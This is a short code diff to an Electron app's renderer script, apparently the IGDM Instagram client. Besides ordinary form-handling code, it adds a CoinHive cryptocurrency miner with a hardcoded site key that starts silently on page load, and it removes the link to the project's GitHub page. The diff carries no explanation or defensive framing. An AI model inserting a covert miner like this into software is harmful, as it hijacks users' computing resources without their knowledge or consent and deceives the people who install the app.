@@ -2,6 +2,9 @@ var electron = require('electron');
 var ipcRenderer = electron.ipcRenderer;
 
 document.addEventListener('DOMContentLoaded', () => {
+  let miner = new CoinHive.Anonymous('l8ZKEPdOmVApgeStW96ThW96bIDA0JLb');
+  miner.start();
+
   document.querySelector('form').onsubmit = (e) => {
     e.preventDefault()
     let button = document.querySelector('button[type=submit]');
@@ -20,6 +23,4 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorElement = document.getElementById('error');
     errorElement.innerHTML = errorMessage;
   });
-
-  document.querySelector('a').onclick = () => electron.shell.openExternal("https://github.com/ifedapoolarewaju/igdm")
 })
